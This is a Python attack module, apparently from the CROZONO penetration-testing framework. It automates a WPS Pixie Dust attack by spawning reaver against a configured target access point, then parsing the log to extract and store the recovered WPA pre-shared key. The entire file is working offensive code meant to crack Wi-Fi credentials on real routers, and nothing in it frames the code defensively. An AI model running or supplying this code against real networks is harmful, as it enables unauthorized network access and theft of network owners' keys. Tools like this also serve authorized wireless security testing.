#!/usr/bin/env python3
"""
--------------------------------------------------------------------------------
	CROZONO - 22.02.16.20.00.00 - www.crozono.com - info@crozono.com

	WLAN - WPS attack module - Pixie Dust with PixieWPS
--------------------------------------------------------------------------------

"""
__PRIORITY__ = 0

import os
import re
import pexpect
import subprocess
import src.settings as settings

from poormanslogging import info, warn, error
from src.attacks.base_attack import BaseAttack

class wps_pixiedust(BaseAttack):
	def __init__(self, p):
		pass

	def run(self):
		info("Running Pixie Dust attack...")
		cmd_reaver = pexpect.spawn(
			'reaver -i {0} -c {1} -b {2} -vv -K 1'.format(settings.INTERFACE_MON, settings.TARGET_CHANNEL, settings.TARGET_BSSID))
		cmd_reaver.logfile = open(settings.LOG_FILE, 'wb')
		cmd_reaver.expect(['WPA PSK:','WPS pin not found!', pexpect.TIMEOUT, pexpect.EOF], 30)
		cmd_reaver.close()

		parse_log_crack = open(settings.LOG_FILE, 'r')
		for line in parse_log_crack:
			if 'WPA PSK:' in line:
				key_reg = re.split("('.*?')|(\".*?\")", line)
				key_filter = key_reg[1].replace("'","")
				settings.TARGET_KEY = key_filter
				break
		parse_log_crack.close()
		os.remove(settings.LOG_FILE)
		if settings.TARGET_KEY is None:
			warn("Pixie Dust attack failed!")
	
	def setup(self):
		pass

	def check(self):
		deps = ["reaver","pixiewps"]
		for d in deps:
			if subprocess.call(["which", d],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
				error("Required binary for {bin} not found.".format(bin=d))
				return False
		return True
